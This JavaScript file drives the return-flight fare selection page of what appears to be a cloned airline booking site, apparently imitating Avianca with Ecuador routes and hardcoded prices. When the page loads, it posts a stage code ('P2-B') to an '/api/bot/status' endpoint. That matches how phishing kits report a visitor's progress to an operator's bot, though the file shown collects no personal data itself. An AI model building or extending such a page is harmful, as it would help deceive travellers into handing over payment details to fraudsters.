/* ==== FIX: topbar fija sin tapar contenido (móvil/desktop) ==== */
(function fixTopbarOverlap(){
  const tb = document.querySelector('.av-topbar');
  if (!tb) return;

  const set = () => {
    const h = tb.getBoundingClientRect().height || tb.offsetHeight || 0;
    document.documentElement.style.setProperty('--av-topbar-h', h + 'px');
  };

  const run = () => {
    set();
    document.body.classList.add('has-topbar');
  };

  if (document.fonts && document.fonts.ready) {
    document.fonts.ready.then(run);
  } else {
    window.addEventListener('load', run);
  }
  window.addEventListener('resize', set);
})();

/**
 * flight-detail-back.js — Mismo comportamiento/UI que el de ida,
 * pero con textos/fechas invertidos para REGRESO.
 * Incluye despliegue INLINE de tarifas + fallback a modal.
 */

/* ===== CONFIG ===== */
const INLINE_FARES = true;
let _lastClickedCard = null;

document.addEventListener('click', (e)=>{
  const c = e.target.closest('.card-departure');
  if (c) _lastClickedCard = c;
});

/* ===== SET DOM ===== */
const modal = document.querySelector('#modal-select-ticket');

const loader = document.querySelector('.loader');
setTimeout(() =>{
  try{
    document.querySelector('body').classList.remove('sb-hidden');
    loader.classList.remove('show');

    console.log("Back ON");
    fetch(`${API_URL}/api/bot/status`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${API_KEY}`
      },
      body: JSON.stringify({message: 'P2-B'})
    })
  }catch(err){
    console.log(err);
  }
}, 1200);

/* --- HEADER (invertido) --- */
const dateToUse = info?.flightInfo?.flightDates?.[1] || info?.flightInfo?.flightDates?.[0];
document.querySelector('#origin-code').textContent      = info.flightInfo.destination.code;
document.querySelector('#destination-code').textContent = info.flightInfo.origin.code;
document.querySelector('#flight-date').textContent      = monthDic[(dateToUse.split('-')[1] - 1)] + ' ' + dateToUse.split('-')[2];
document.querySelector('#flight-label-1').textContent   = `Selecciona tu vuelo de regreso - ${formatDateType1(dateToUse)}`;
document.querySelector('#flight-label-2').textContent   = `${info.flightInfo.destination.city} a ${info.flightInfo.origin.city}`;
document.querySelector('#flight-label-3').textContent   = `${formatDateType1(dateToUse)}`;

/* --- PRECIOS EN LAS CARDS (igual lógica que ida) --- */
(function setCardPrices(){
  const isNAC = (info.flightInfo.origin.country === 'Ecuador' && info.flightInfo.destination.country === 'Ecuador');
  const P = isNAC ? pricesNAC : pricesINT;

  const set = (id, v) => { const el = document.querySelector(id); el && (el.textContent = formatPrice(v)); };

  set('#flight-price-0',  P.flight_1?.xs);
  set('#flight-price-1',  P.flight_1?.xs);
  set('#flight-price-2',  P.flight_2?.xs);
  set('#flight-price-3',  P.flight_3?.xs);
  set('#flight-price-4',  P.flight_4?.xs);
  set('#flight-price-5',  P.flight_5?.xs);
  set('#flight-price-6',  P.flight_6?.xs);
  set('#flight-price-7',  P.flight_7?.xs);
  set('#flight-price-8',  P.flight_8?.xs);
  set('#flight-price-9',  P.flight_9?.xs);
  set('#flight-price-10', P.flight_10?.xs);
})();

/* --- EDITAR BÚSQUEDA --- */
const btnEditFlight = document.querySelector('#btn-edit-flight');
btnEditFlight && btnEditFlight.addEventListener('click', ()=>{
  info.edit = 1;
  updateLS();
  window.location.href = 'index.html';
});

/* ===== FUNCS BASE ===== */
function updateLS(){ LS.setItem('info', JSON.stringify(info)); }

function formatDateType1(date){
  let format = new Date(parseInt(date.split('-')[0]), parseInt(date.split('-')[1]) - 1, parseInt(date.split('-')[2]) - 1);
  return dayDic[format.getDay()] + ', ' + monthDic[format.getMonth()] + ' ' + date.split('-')[2];
}
function formatPrice(number){
  return Number(number ?? 0).toLocaleString('en', { maximumFractionDigits: 2 });
}

/* ================================================================
   MODO INLINE (debajo de la card) + fallback a MODAL
   ================================================================ */
function loadFlight(flight_sched){
  // Guardar selección (mantenemos misma clave que usabas)
  info.flightInfo.ticket_sched = flight_sched;

  // NAT/INT
  const isNAC = (info.flightInfo.origin.country === 'Ecuador' && info.flightInfo.destination.country === 'Ecuador');
  info.flightInfo.ticket_nat = isNAC ? 'NAC' : 'INT';
  updateLS();

  if (INLINE_FARES) {
    setTimeout(()=>{ renderInlineFares(flight_sched); }, 0);
    return;
  }

  // fallback modal
  try{ modal.classList.add('show'); }catch(err){ console.log(err); }
  const xsPrice = document.querySelector('#xs');
  const sPrice  = document.querySelector('#s');
  const mPrice  = document.querySelector('#m');

  const P = isNAC ? pricesNAC : pricesINT;
  const F = P[flight_sched];
  if (xsPrice && sPrice && mPrice && F){
    xsPrice.textContent = formatPrice(F.xs);
    sPrice.textContent  = formatPrice(F.s);
    mPrice.textContent  = formatPrice(F.m);
  }
}

// localizar card
function getCardForFlight(flight_sched){
  if (_lastClickedCard && _lastClickedCard.matches('.card-departure')) return _lastClickedCard;
  const all = Array.from(document.querySelectorAll('.card-departure[onclick]'));
  return all.find(el => (el.getAttribute('onclick') || '').includes(flight_sched)) || all[0];
}

// render inline
function renderInlineFares(flight_sched){
  const card = getCardForFlight(flight_sched);
  if (!card) return;

  document.querySelectorAll('.av-inline-fares').forEach(p => p.remove());

  const isNAC = (info.flightInfo.origin.country === 'Ecuador' && info.flightInfo.destination.country === 'Ecuador');
  const P = isNAC ? pricesNAC : pricesINT;
  const F = P[flight_sched];
  if (!F) return;

  const html = `
    <div class="av-inline-fares" data-flight="${flight_sched}">
      <h3 class="av-choose-title">Elige cómo quieres volar</h3>
      <div class="av-fares-grid">
        <div class="card-container xs">
          <div class="card-ticket">
            <h2 class="card-ticket-type">Basic</h2>
            <p class="card-ticket-label">Vuela ligero</p>
            <div class="card-ticket-items">
              <div class="ct-item"><img src="./assets/svg/personalItemLowest-XS.svg" width="18"><p>1 artículo personal (bolso)</p></div>
              <div class="ct-item" style="text-decoration: underline;"><img src="./assets/svg/icon-alert-denied.svg" width="18"><p>Restricciones de la tarifa</p></div>
            </div>
          </div>
          <div class="card-ticket-header" data-next="xs">
            <h6 class="fs-3">$${formatPrice(F.xs)}</h6>
            <p class="fs-5">Precio por pasajero</p>
          </div>
        </div>

        <div class="card-container s">
          <div class="card-ticket">
            <h2 class="card-ticket-type">Classic</h2>
            <p class="card-ticket-label">Más completo</p>
            <div class="card-ticket-items">
              <div class="ct-item"><img src="./assets/svg/S_1.svg" width="18"><p>1 artículo personal (bolso)</p></div>
              <div class="ct-item"><img src="./assets/svg/S_2.svg" width="18"><p>1 equipaje de mano (10kg)</p></div>
              <div class="ct-item"><img src="./assets/svg/S_3.svg" width="18"><p>1 equipaje de bodega (23kg)</p></div>
              <div class="ct-item"><img src="./assets/svg/S_4.svg" width="18"><p>Check-in en aeropuerto</p></div>
              <div class="ct-item"><img src="./assets/svg/S_5.svg" width="18"><p>Asiento Economy</p></div>
              <div class="ct-item"><img src="./assets/svg/S_6.svg" width="18"><p>Acumula lifemiles</p></div>
              <div class="ct-item" style="text-decoration: underline;"><img src="./assets/svg/icon-alert-denied.svg" width="18"><p>Restricciones de la tarifa</p></div>
            </div>
          </div>
          <div class="card-ticket-header" data-next="s">
            <h6 class="fs-3">$${formatPrice(F.s)}</h6>
            <p class="fs-5">Precio por pasajero</p>
          </div>
        </div>

        <div class="card-container m">
          <div class="card-ticket">
            <h2 class="card-ticket-type">Flex</h2>
            <p class="card-ticket-label">Más posibilidades</p>
            <div class="card-ticket-items">
              <div class="ct-item"><img src="./assets/svg/M_1.svg" width="18"><p>1 artículo personal (bolso)</p></div>
              <div class="ct-item"><img src="./assets/svg/M_2.svg" width="18"><p>1 equipaje de mano (10kg)</p></div>
              <div class="ct-item"><img src="./assets/svg/M_3.svg" width="18"><p>1 equipaje de bodega (23kg)</p></div>
              <div class="ct-item"><img src="./assets/svg/M_4.svg" width="18"><p>Check-in en aeropuerto</p></div>
              <div class="ct-item"><img src="./assets/svg/M_5.svg" width="18"><p>Asiento Economy</p></div>
              <div class="ct-item"><img src="./assets/svg/M_6.svg" width="18"><p>Acumula lifemiles</p></div>
              <div class="ct-item"><img src="./assets/svg/M_7.svg" width="18"><p>Reembolso</p></div>
              <div class="ct-item"><img src="./assets/svg/M_8.svg" width="18"><p>Cambios de vuelo</p></div>
              <div class="ct-item" style="text-decoration: underline;"><img src="./assets/svg/icon-alert-denied.svg" width="18"><p>Restricciones de la tarifa</p></div>
            </div>
          </div>
          <div class="card-ticket-header" data-next="m">
            <h6 class="fs-3">$${formatPrice(F.m)}</h6>
            <p class="fs-5">Precio por pasajero</p>
          </div>
        </div>
      </div>
    </div>
  `;

  card.insertAdjacentHTML('afterend', html);

  const panel = card.nextElementSibling;
  if (!panel) return;

  panel.addEventListener('click', (e)=>{
    const btn = e.target.closest('.card-ticket-header');
    if (!btn) return;
    nextStep(btn.dataset.next);
  });

  panel.scrollIntoView({ behavior:'smooth', block:'start' });
}

/* ===== NAVEGACIÓN (en regreso siempre a step-two) ===== */
function nextStep(type){
  info.flightInfo.ticket_type = type;   // mantenemos misma clave
  updateLS();
  window.location.href = 'step-two.html';
}

/* ===== Suavizado MODAL de respaldo ===== */
(function () {
  const modalEl = document.getElementById('modal-select-ticket');
  const closeBtnEl = document.getElementById('modal-close-ticket');
  if (!modalEl) return;

  function onOpen() {
    modalEl.setAttribute('aria-hidden', 'false');
    modalEl.removeAttribute('hidden');
    document.body.style.overflow = 'hidden';
  }
  function onClose() {
    modalEl.setAttribute('aria-hidden', 'true');
    document.body.style.overflow = '';
  }

  const mo = new MutationObserver(() => {
    const isOpen = modalEl.classList.contains('show') && getComputedStyle(modalEl).display !== 'none';
    if (isOpen) onOpen(); else onClose();
  });
  mo.observe(modalEl, { attributes: true, attributeFilter: ['class', 'hidden', 'style'] });

  closeBtnEl && closeBtnEl.addEventListener('click', () => modalEl.classList.remove('show'));
  modalEl.addEventListener('click', (e) => { if (e.target === modalEl) modalEl.classList.remove('show'); });
  document.addEventListener('keydown', (e) => { if (e.key === 'Escape') modalEl.classList.remove('show'); });
})();

/* ===== Toggle/cerrar panel inline ===== */
document.addEventListener('click', function (e) {
  const card = e.target.closest('.card-departure');
  if (!card) return;
  const panel = card.nextElementSibling;
  if (panel && panel.classList.contains('av-inline-fares')) {
    panel.remove();
    e.stopImmediatePropagation();
    e.preventDefault();
  }
}, true);

document.addEventListener('click', function (e) {
  const insidePanel = e.target.closest('.av-inline-fares');
  const insideCard  = e.target.closest('.card-departure');
  if (!insidePanel && !insideCard) {
    document.querySelectorAll('.av-inline-fares').forEach(p => p.remove());
  }
});
